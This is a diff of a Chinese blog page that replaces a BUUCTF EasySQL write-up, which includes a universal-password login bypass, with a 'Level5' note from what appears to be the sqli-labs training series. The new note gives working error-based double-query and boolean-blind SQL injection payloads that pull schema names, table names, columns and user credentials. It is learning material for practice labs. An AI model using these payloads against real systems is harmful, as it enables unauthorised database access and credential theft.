@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题003 - lll-nnnのblog</title>
+  <title>Level5 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题003">
+            <span class="h2" id="subtitle" title="Level5">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-17 11:43" pubdate>
-        2021年1月17日 中午
+      <time datetime="2021-01-19 17:38" pubdate>
+        2021年1月19日 下午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      218 字
+      703 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      10
        分钟
     </span>
   
@@ -224,23 +224,31 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题003</h1>
+            <h1 style="display: none">Level5</h1>
             
             <div class="markdown-body">
-              <h2 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h2><ul>
-<li><p>题目：[极客大挑战 2019]EasySQL<br>打开网页：<img src="https://ftp.bmp.ovh/imgs/2021/01/e63e9622302a8b1e.png" srcset="/img/loading.gif">           </p>
+              <h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><ul>
+<li><p>分析<br>GET-Double injection-Single Quotes-String<br>GET-双重注入-单引号-字符串<br>输入<code>?id=1</code>，输出为：<img src="https://s1.imagehub.cc/images/2021/01/19/01dc313d1d917e646e.png" srcset="/img/loading.gif" alt="01dc313d1d917e646e.png"><br><code>?id=22</code>没有输出；<code>?id=1&#39;</code>报错；根据题目，应该用双重注入：一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询<br>，如<code>select concat((select database()));</code><br>几个函数：    </p>
+<blockquote>
+<p>count(expression)：     返回查询的记录总数，expression 参数是一个字段或者 * 号<br>rand()：返回0到1的随机数<br>floor(x)     返回小于或等于 x 的最大整数<br>group by语句：把结果分组输出<br>concat()：连接两条语句<br>重要语句：*<em>``id=1’ union SELECT null,count(</em>),concat((payload),floor(rand()*2))as a from information_schema.tables group by a%23<br>``**其中payload为sql语句      </p>
+</blockquote>
 </li>
-<li><p>分析<br>F12看到源码中有个check.php,访问后也没得到有价值的信息；<br>题目是EasySQL，那就是SQL注入了吧；<br>输入：用户名：1’       密码：1<br>发现报错：<img src="https://ftp.bmp.ovh/imgs/2021/01/3ddef4ddc63b0e86.png" srcset="/img/loading.gif"><br>所以应该是字符型注入           </p>
-</li>
-<li><p>解<br><img src="https://ftp.bmp.ovh/imgs/2021/01/06ec27df80b3a0e3.png" srcset="/img/loading.gif"><br>得到flag：<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0144b5f527675cfb.png" srcset="/img/loading.gif"><br>或者使用万能密码：<code>admin&#39; or &#39;1&#39;=&#39;1</code><br>拼接的sql语句为：<code>username=admin&#39; or &#39;1&#39;=&#39;1&amp;password=admin&#39; or &#39;1&#39;=&#39;1</code><br>也可以得到flag。      </p>
-</li>
-<li><p>知识点      </p>
-</li>
-<li><p>*字符型注入**<br>存在SQL注入漏洞的URL参数为字符串类型（需要使用单引号表示）<br>关键在于<strong>单引号闭合</strong><br>mysql数据库对于单引号的规则如下：</p>
-<pre><code>  &gt; 单引号必须成对出现，否则数据库就会报错。           
-   如果两个单引号之间内容为空，数据库自动忽略。</code></pre>
+<li><p>开始注入<br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(schema_name) from information_schema.schemata ),floor(rand()*2))as a from information_schema.tables group by a%23</code>得到所有库名<img src="https://s1.imagehub.cc/images/2021/01/19/502.png" srcset="/img/loading.gif" alt="502.png"><br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),floor(rand()*2))as a from information_schema.tables group by a%23</code>得到security下的表<img src="https://s1.imagehub.cc/images/2021/01/19/503.png" srcset="/img/loading.gif" alt="503.png">值得注意的是,最后一个表是users，1是rand生成拼接的。<br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; ),floor(rand()*2))as a from information_schema.tables group by a%23</code>users下的列<img src="https://s1.imagehub.cc/images/2021/01/19/504.png" srcset="/img/loading.gif" alt="504.png"><br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(username,password) from security.users ),floor(rand()*2))as a from information_schema.tables group by a%23</code>查数据出现问题了，这段语句的输出是<code>You are in...........</code>不知道为什么，感觉没错啊，换成这样的<code>?id=1&#39; union SELECT null,count(*),concat((select username from security.users ),floor(rand()*2))as a from information_schema.tables group by a%23</code>,输出<code> Subquery returns more than 1 row</code>，再加上limit，一个一个查，得到所有的username和password。<br>这种方法有时候回车一次不会成功，得多注几次。      </p>
 </li>
 </ul>
+<hr>
+<hr>
+<ul>
+<li><strong>bool盲注</strong><br>几个函数        <blockquote>
+<p>substr(s, start, length)     从字符串 s 的 start 位置截取长度为 length 的子字符串<br>Length（）函数 返回字符串的长度<br>ascii(s)     返回字符串 s 的第一个字符的 ASCII 码。          </p>
+</blockquote>
+</li>
+</ul>
+<p>正确时返回<code>You are in...</code>;错误时无返回<br><code>?id=1&#39; and length(database())&gt;8%23</code>无返回，7有返回，说明当前数据库的长度为8<br><code>?id=1&#39; and ascii(substr(database(),1,1))&gt;115%23</code>无返回,114有返回，说明库名第一个字母为s<br><code>?id=1&#39; and ascii(substr(database(),2,1))&gt;101%23</code>无返回，100有返回，说明第二个字母为e<br><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>            </p>
+<p><code>?id=1&#39;and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;6%23</code>判断（第一个）表的长度        </p>
+<p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97%23</code>（第一个）表的（第一个）字符        </p>
+<p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>?id=1&#39;and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))&gt;65%23</code>（users）下（第一列）的（第一个）字符       </p>
+<p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select username from security.users limit 0,1),1,1)))&gt;65%23</code>         </p>
 
             </div>
             <hr>
@@ -251,7 +259,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                      <a class="hover-with-bg" href="/tags/note/">note</a>
                     
                   </div>
                 
@@ -264,18 +272,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/17/leve1/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Level1~~level4</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/16/BUU002/">
-                        <span class="hidden-mobile">BUU每日一题002</span>
+                      <a href="/2021/01/19/BUU005/">
+                        <span class="hidden-mobile">BUU每日一题005</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
